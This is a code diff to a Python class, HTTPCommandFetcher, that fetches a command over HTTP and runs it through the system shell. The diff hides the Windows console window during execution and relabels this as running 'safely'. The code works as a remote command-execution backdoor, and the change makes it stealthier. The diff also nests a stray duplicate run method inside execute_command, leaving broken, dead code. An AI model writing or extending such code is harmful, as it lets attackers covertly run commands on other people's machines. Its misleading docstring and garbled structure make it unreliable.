@@ -53,12 +53,11 @@ class HTTPCommandFetcher:
             return None
 
     def execute_command(self, command):
-        """Executes the fetched command using the determined interface."""
+        """Executes the fetched command safely without flashing windows."""
         try:
             interface_path = self.find_command_interface()
             print(f"[+] Using command processor: {interface_path}")
-
-            # Determine the correct argument flag to execute a single string
+    
             interface_name = os.path.basename(interface_path).lower()
             if 'cmd' in interface_name:
                 flag = '/c'
@@ -66,26 +65,40 @@ class HTTPCommandFetcher:
                 flag = '-Command'
             else:
                 flag = '-c'
-
+    
             print(f"[*] Executing command: {command}")
-            
-            # Execute and capture output
+    
+            # Windows-specific: hide the console window
+            startupinfo = None
+            if platform.system().lower() == "windows":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    
             result = subprocess.run(
                 [interface_path, flag, command],
                 capture_output=True,
                 text=True,
                 encoding='utf-8',
-                errors='replace'
+                errors='replace',
+                startupinfo=startupinfo  
             )
-            
+    
             print("[+] Execution complete.")
             if result.stdout:
                 print(f"--- STDOUT ---\n{result.stdout.strip()}")
             if result.stderr:
                 print(f"--- STDERR ---\n{result.stderr.strip()}")
-                
+    
         except Exception as e:
             print(f"[!] Failed to execute command: {e}")
+    
+        def run(self):
+            """Main lifecycle: Fetch 1 command, execute it, and exit."""
+            command = self.fetch_command()
+            if command:
+                self.execute_command(command)
+            else:
+                print("[*] No command received or fetch failed. Exiting.")
 
     def run(self):
         """Main lifecycle: Fetch 1 command, execute it, and exit."""
